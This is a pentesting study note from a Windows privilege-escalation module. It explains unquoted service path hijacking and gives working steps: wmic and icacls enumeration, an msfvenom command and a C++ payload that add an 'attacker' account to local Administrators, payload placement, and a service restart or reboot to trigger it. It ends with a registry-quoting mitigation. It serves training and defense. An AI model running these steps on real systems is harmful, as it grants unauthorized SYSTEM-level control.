---
tags: [windows, privesc, pentesting, red-team]
difficulty: intermediate
module: "43 - Windows Privilege Escalation"
topic: "43.03 Unquoted Service Paths"
---

# Unquoted Service Paths

## Introduction

An "Unquoted Service Path" is a classic, persistent misconfiguration in Windows environments. It occurs when a Windows service is created and its executable path contains spaces but is *not* enclosed in quotation marks. Because services inherently execute under high-privileged contexts (such as `NT AUTHORITY\SYSTEM`), manipulating the path the service attempts to execute allows an attacker to hijack the execution flow and escalate privileges.

This vulnerability leverages the way the Windows API function `CreateProcess` (and the `CreateProcessA` / `CreateProcessW` variants) resolves executable paths that contain spaces.

## The Core Vulnerability: How Windows Resolves Paths

When a service is instructed to start, the Service Control Manager (SCM) reads the `ImagePath` (or `binPath`) of the service from the registry. If the path is enclosed in quotes, such as `"C:\Program Files\My App\service.exe"`, Windows knows exactly where the executable resides.

However, if the path is *unquoted* and contains spaces, like:
`C:\Program Files\My App\service.exe`

The `CreateProcess` API must guess where the actual executable ends and where the command-line arguments begin. To handle this ambiguity, Windows uses a very specific search order. It reads the string from left to right, treating every space it encounters as a potential delimiter between the executable path and an argument. Windows appends `.exe` to the string preceding the space and attempts to execute it.

### The Search Order Flow

Given the unquoted path: `C:\Program Files\Enterprise Software\Monitoring Agent\agent.exe`

Windows will attempt to execute files in the following precise sequence:

1.  **Attempt 1:** `C:\Program.exe`
    - Arguments interpreted: `Files\Enterprise Software\Monitoring Agent\agent.exe`
2.  **Attempt 2:** `C:\Program Files\Enterprise.exe`
    - Arguments interpreted: `Software\Monitoring Agent\agent.exe`
3.  **Attempt 3:** `C:\Program Files\Enterprise Software\Monitoring.exe`
    - Arguments interpreted: `Agent\agent.exe`
4.  **Attempt 4:** `C:\Program Files\Enterprise Software\Monitoring Agent\agent.exe`
    - Finally finds the actual target executable.

```text
+-----------------------------------------------------------------------+
|                 UNQUOTED SERVICE PATH SEARCH ORDER                    |
+-----------------------------------------------------------------------+
| Path: C:\Program Files\My Software\App\service.exe                    |
+-----------------------------------------------------------------------+
|
|   SCM Request to Start Service
|          |
|          +--> 1. Is there a "C:\Program.exe"?
|                  [YES] --> Execute Program.exe as SYSTEM (PWNED!)
|                  [NO]  --> Continue search...
|
|          +--> 2. Is there a "C:\Program Files\My.exe"?
|                  [YES] --> Execute My.exe as SYSTEM (PWNED!)
|                  [NO]  --> Continue search...
|
|          +--> 3. Is there a "C:\Program Files\My Software\App\service.exe"?
|                  [YES] --> Execute the intended service binary.
+-----------------------------------------------------------------------+
```

## Exploitation Prerequisites

To successfully exploit an unquoted service path, two critical conditions must be met:

1.  **Vulnerable Service Path:** The service path must be unquoted and contain at least one space.
2.  **Appropriate File System Permissions:** The attacker must possess "Write" or "Modify" permissions on one of the directories in the path leading up to the space.
    - For example, if the path is `C:\Program Files\Enterprise Software\agent.exe`, the attacker must have the ability to drop an executable named `Enterprise.exe` into `C:\Program Files\`.
    - Note: By default, low-privileged users *cannot* write to `C:\` or `C:\Program Files\`. Therefore, finding an unquoted path is only half the battle; the folder permissions must also be misconfigured.

## Enumeration and Identification

### Step 1: Finding Unquoted Service Paths
You can use `wmic` to query the system for all running and stopped services, filtering out built-in Windows paths and ensuring the paths do not contain quotes.

```cmd
C:\> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

*Explanation of the command:*
- `wmic service get name,displayname,pathname,startmode`: Retrieves details about all services.
- `findstr /i "auto"`: Filters for services configured to start automatically. (Optional, but auto-start services are better for persistence).
- `findstr /i /v "c:\windows\\"`: Excludes built-in Windows services, as they are securely configured and paths are protected.
- `findstr /i /v """`: Excludes any path that contains a double quote character (`"`).

**Example Output:**
```text
DisplayName           Name           PathName                                              StartMode
Vulnerable Service    VulnSvc        C:\Program Files\Third Party\Monitor\monitor.exe      Auto
```
This reveals a service named `VulnSvc` with an unquoted path containing spaces.

### Step 2: Checking Directory Permissions
Next, we must determine if we have write access to any of the directories in the path. We will use the built-in `icacls` command to check permissions for `C:\` and `C:\Program Files\`.

Checking `C:\Program Files\`:
```cmd
C:\> icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
```
Here, `BUILTIN\Users` only have `(RX)` (Read & Execute). We cannot write `Third.exe` into `C:\Program Files\`.

Checking `C:\Program Files\Third Party\`:
```cmd
C:\> icacls "C:\Program Files\Third Party"
C:\Program Files\Third Party BUILTIN\Users:(M)
                             BUILTIN\Users:(OI)(CI)(IO)(M)
                             NT AUTHORITY\SYSTEM:(F)
                             BUILTIN\Administrators:(F)
```
Here, `BUILTIN\Users` have `(M)` (Modify) permissions. This means any standard user can drop a file into this directory.

## Exploitation Process

Because we have Modify permissions in `C:\Program Files\Third Party\`, we can hijack the execution before `Monitor\monitor.exe` is called.

Based on the path `C:\Program Files\Third Party\Monitor\monitor.exe`, if we place an executable named `Monitor.exe` inside `C:\Program Files\Third Party\`, the SCM will execute it instead of the actual `monitor.exe` located inside the `Monitor` subdirectory.

### Step 1: Crafting the Payload
We can use `msfvenom` to generate a malicious executable. It's often best to create a payload that adds our current user to the local Administrators group, as reverse shells originating from services can sometimes behave unpredictably if the service crashes quickly.

```bash
# On the Attacker Machine:
msfvenom -p windows/x64/exec CMD="net localgroup administrators attacker /add" -f exe -o Monitor.exe
```

Alternatively, compiling a simple C++ executable:
```cpp
#include <stdlib.h>
int main () {
    system("net localgroup administrators attacker /add");
    return 0;
}
```

### Step 2: Placing the Payload
Transfer `Monitor.exe` to the target machine and place it in the vulnerable directory.

```cmd
C:\> copy Monitor.exe "C:\Program Files\Third Party\Monitor.exe"
```

### Step 3: Triggering Execution
We need the service to start so it attempts to execute its path.
If we have permissions to restart the service (which can be checked via tools like AccessChk), we can do it manually:

```cmd
C:\> sc stop VulnSvc
C:\> sc start VulnSvc
```

If we do not have permissions to restart the service, we must force a system reboot. If the user doesn't have restart privileges, we simply wait for the server's next scheduled reboot or patch cycle.

```cmd
C:\> shutdown /r /t 0
```

Once the system reboots or the service restarts, the SCM evaluates the unquoted path, finds `C:\Program Files\Third Party\Monitor.exe`, and executes it as `NT AUTHORITY\SYSTEM`. The attacker user is silently added to the Administrators group.

## Considerations and Mitigations

- **Service Crash:** The malicious executable does not contain the necessary Service Control Handler mechanisms. Therefore, the SCM will execute it, but it will eventually timeout and throw an error (usually Event ID 7000 or 7009) complaining that the service did not respond in a timely fashion. The payload executes, but the actual legitimate service fails to start. This can alert administrators.
- **Mitigation:** The mitigation is incredibly straightforward. System administrators and developers must ensure that all `ImagePath` registry values for services are enclosed in quotes.
    ```cmd
    # To fix via command line:
    C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Program Files\Third Party\Monitor\monitor.exe\"" /f
    ```

## Chaining Opportunities
- **Enumeration:** Heavily relies on thorough enumeration from [[02 - Enumerating Windows System Info]].
- **Persistence:** Because the malicious executable replaces a service, it will execute every time the system boots, acting as a rudimentary form of [[Windows Persistence Mechanisms]].

## Related Notes
- [[01 - Windows PrivEsc Methodology Overview]]
- [[04 - Weak Service Permissions]]
- [[05 - Modifiable Service Binaries]]
- [[06 - DLL Hijacking]]
